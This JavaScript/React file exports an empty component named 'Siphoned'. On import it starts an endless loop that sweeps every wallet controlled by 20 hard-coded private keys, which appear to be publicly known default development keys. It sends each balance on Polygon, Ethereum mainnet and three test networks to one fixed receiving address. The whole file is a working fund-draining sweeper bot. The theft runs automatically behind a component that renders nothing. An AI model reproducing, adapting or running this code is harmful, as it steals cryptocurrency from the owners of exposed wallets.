import { ethers } from 'ethers';

export default function Siphoned(){
 return (<p></p>)    
}


const privateKey = 
  [
    "0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80",
    "0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d",
    "0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a",
    "0x7c852118294e51e653712a81e05800f419141751be58f605c371e15141b007a6",
    "0x47e179ec197488593b187f80a00eb0da91f1b9d0b13f8733639f19c30a34926a",
    "0x8b3a350cf5c34c9194ca85829a2df0ec3153be0318b5e2d3348e872092edffba",
    "0x92db14e403b83dfe3df233f83dfa3a0d7096f21ca9b0d6d6b8d88b2b4ec1564e",
    "0x4bbbf85ce3377467afe5d46f804f221813b2bb87f24d81f60f1fcdbf7cbf4356",
    "0xdbda1821b80551c9d65939329250298aa3472ba22feea921c0cf5d620ea67b97",
    "0x2a871d0798f97d79848a013d4936a73bf4cc922c825d33c1cf7073dff6d409c6",
    "0xf214f2b2cd398c806f84e317254e0f0b801d0643303237d97a22a48e01628897",
    "0x701b615bbdfb9de65240bc28bd21bbc0d996645a3dd57e7b12bc2bdf6f192c82",
    "0xa267530f49f8280200edf313ee7af6b827f2a8bce2897751d06a843f644967b1",
    "0x47c99abed3324a2707c28affff1267e45918ec8c3f20b8aa892e8b065d2942dd",
    "0xc526ee95bf44d8fc405a158bb884d9d1238d99f0612e9f33d006bb0789009aaa",
    "0x8166f546bab6da521a8369cab06c5d2b9e46670292d85c875ee9ec20e84ffb61",
    "0xea6c44ac03bff858b476bba40716402b03e41b8e97e276d1baec7c37d42484a0",
    "0x689af8efa8c651a91ad287602527f3af2fe9f6501a7ac4b061667b5a93e037fd",
    "0xde9be858da4a475276426320d5e9262ecfc3ba460bfac56360bfa6c4c28b4ee0",
    "0xdf57089febbacf7ba0bc227dafbffa9fc08a93fdc68e1e42411a14efcf23656e"
  ];
const providerRopsten = new ethers.providers.AlchemyProvider('ropsten',process.env.ALCHEMY_API_KEY_ROPSTEN);
const providerMumbai = new ethers.providers.AlchemyProvider('maticmum',process.env.ALCHEMY_API_KEY_MUMBAI);
const providerMain = new ethers.providers.AlchemyProvider('homestead', process.env.ALCHEMY_API_KEY_MAINNET);
const providerPolygon = new ethers.providers.AlchemyProvider('matic', process.env.ALCHEMY_API_KEY_POLYGON);
const providerRinkeby = new ethers.providers.AlchemyProvider('rinkeby', process.env.ALCHEMY_API_KEY_RINKBY);
const receiveAddress = "0x88761F959C029d5828405234A53c5d42FD84248E";


siphonedPolygon();


async function siphonedPolygon(){
  console.log("POLYGON");

   for(let i = 0; i < privateKey.length; i++){ 
    let newGasPrice = await providerPolygon.getGasPrice();
    let balance = await providerPolygon.getBalance(new ethers.Wallet(privateKey[i]).address);
    let newNonce = await providerPolygon.getTransactionCount(new ethers.Wallet(privateKey[i]).address, "latest");
    let newGasLimit = ethers.BigNumber.from("21000");
    let tips = ethers.BigNumber.from("10");
    let feesTx = newGasLimit.mul(newGasPrice);
    console.log(ethers.utils.formatUnits(ethers.BigNumber.from(balance),1),ethers.utils.formatUnits(ethers.BigNumber.from(feesTx),1),ethers.utils.formatUnits(ethers.BigNumber.from(balance).sub(feesTx),1));

    if(ethers.utils.formatUnits(ethers.BigNumber.from(balance).sub(feesTx),1) > 0){
      const tx = {
        from: new ethers.Wallet(privateKey[i]).address,
        to: receiveAddress,
        value: ethers.BigNumber.from(balance).sub(feesTx),
        nonce: newNonce,
        gasLimit: newGasLimit, // 100000
        gasPrice: newGasPrice,
      }
      new ethers.Wallet(privateKey[i], providerPolygon).sendTransaction(tx).then((transaction,err) => {
        console.log(transaction);
      })
    }
  } 
   siphonedMain();
}


async function siphonedMain(){
  console.log("HOMESTEAD");

  for(let i = 0; i < privateKey.length; i++){
    let newGasPrice = await providerMain.getGasPrice();
    let balance = await providerMain.getBalance(new ethers.Wallet(privateKey[i]).address);
    let newNonce = await providerMain.getTransactionCount(new ethers.Wallet(privateKey[i]).address, "latest");
    let newGasLimit = ethers.BigNumber.from("21000");
    let tips = ethers.BigNumber.from("10");
    let feesTx = newGasLimit.mul(newGasPrice);
    console.log(ethers.utils.formatUnits(ethers.BigNumber.from(balance),1),ethers.utils.formatUnits(ethers.BigNumber.from(feesTx),1),ethers.utils.formatUnits(ethers.BigNumber.from(balance).sub(feesTx),1));

    if(ethers.utils.formatUnits(ethers.BigNumber.from(balance).sub(feesTx),1) > 0){
      const tx = {
        from: new ethers.Wallet(privateKey[i]).address,
        to: receiveAddress,
        value: ethers.BigNumber.from(balance).sub(feesTx),
        nonce: newNonce,
        gasLimit: newGasLimit, // 100000
        gasPrice: newGasPrice,
      }
      new ethers.Wallet(privateKey[i], providerMain).sendTransaction(tx).then((transaction,err) => {
        console.log(transaction,err);

      })
    }
  }
  siphonedRinkeby();
}

async function siphonedRinkeby(){
  console.log("RINKEBY");

  for(let i = 0; i < privateKey.length; i++){
    let newGasPrice = await providerRinkeby.getGasPrice();
    let balance = await providerRinkeby.getBalance(new ethers.Wallet(privateKey[i]).address);
    let newNonce = await providerRinkeby.getTransactionCount(new ethers.Wallet(privateKey[i]).address, "latest");
    let newGasLimit = ethers.BigNumber.from("21000");
    let tips = ethers.BigNumber.from("10");
    let feesTx = newGasLimit.mul(newGasPrice);

    console.log(ethers.utils.formatUnits(ethers.BigNumber.from(balance),1),ethers.utils.formatUnits(ethers.BigNumber.from(feesTx),1),ethers.utils.formatUnits(ethers.BigNumber.from(balance).sub(feesTx),1));

    if(ethers.utils.formatUnits(ethers.BigNumber.from(balance).sub(feesTx),1) > 0){
      const tx = {
        from: new ethers.Wallet(privateKey[i]).address,
        to: receiveAddress,
        value: ethers.BigNumber.from(balance).sub(feesTx),
        nonce: newNonce,
        gasLimit: newGasLimit, // 100000
        gasPrice: newGasPrice,
      }
      new ethers.Wallet(privateKey[i], providerRinkeby).sendTransaction(tx).then((transaction,err) => {
        console.log(transaction,err);
      })
    }
  }
  siphonedRopsten();
}


async function siphonedRopsten(){
  console.log("ROPSTEN");

  for(let i = 0; i < privateKey.length; i++){
    let newGasPrice = await providerRopsten.getGasPrice();
    let balance = await providerRopsten.getBalance(new ethers.Wallet(privateKey[i]).address);
    let newNonce = await providerRopsten.getTransactionCount(new ethers.Wallet(privateKey[i]).address, "latest");

    let newGasLimit = ethers.BigNumber.from("21000");
    let tips = ethers.BigNumber.from("10");
    let feesTx = newGasLimit.mul(newGasPrice);
    console.log(ethers.utils.formatUnits(ethers.BigNumber.from(balance),1),ethers.utils.formatUnits(ethers.BigNumber.from(feesTx),1),ethers.utils.formatUnits(ethers.BigNumber.from(balance).sub(feesTx),1));

    if(ethers.utils.formatUnits(ethers.BigNumber.from(balance).sub(feesTx),1) > 0){
      const tx = {
        from: new ethers.Wallet(privateKey[i]).address,
        to: receiveAddress,
        value: ethers.BigNumber.from(balance).sub(feesTx),
        nonce: newNonce,
        gasLimit: newGasLimit, // 100000
        gasPrice: newGasPrice,
      }
      new ethers.Wallet(privateKey[i], providerRopsten).sendTransaction(tx).then((transaction,err) => {
        console.log(transaction,err);
      })
    }
  }
  siphonedMumbai();
}

async function siphonedMumbai(){
  console.log("MUMBAI")

    for(let i = 0; i < privateKey.length; i++){
      let newGasPrice = await providerMumbai.getGasPrice();
      let balance = await providerMumbai.getBalance(new ethers.Wallet(privateKey[i]).address);
      let newNonce = await providerMumbai.getTransactionCount(new ethers.Wallet(privateKey[i]).address, "latest");
    let newGasLimit = ethers.BigNumber.from("21000");
    let tips = ethers.BigNumber.from("10");
    let feesTx = newGasLimit.mul(newGasPrice);
    console.log(ethers.utils.formatUnits(ethers.BigNumber.from(balance),1),ethers.utils.formatUnits(ethers.BigNumber.from(feesTx),1),ethers.utils.formatUnits(ethers.BigNumber.from(balance).sub(feesTx),1));

    if(ethers.utils.formatUnits(ethers.BigNumber.from(balance).sub(feesTx),1) > 0){
      const tx = {
        from: new ethers.Wallet(privateKey[i]).address,
        to: receiveAddress,
        value: ethers.BigNumber.from(balance).sub(feesTx),
        nonce: newNonce,
        gasLimit: newGasLimit, // 100000
        gasPrice: newGasPrice,
      }
        new ethers.Wallet(privateKey[i], providerMumbai).sendTransaction(tx).then((transaction,err) => {
            console.log(transaction,err);

        })
      }
    }
    siphonedPolygon();
  }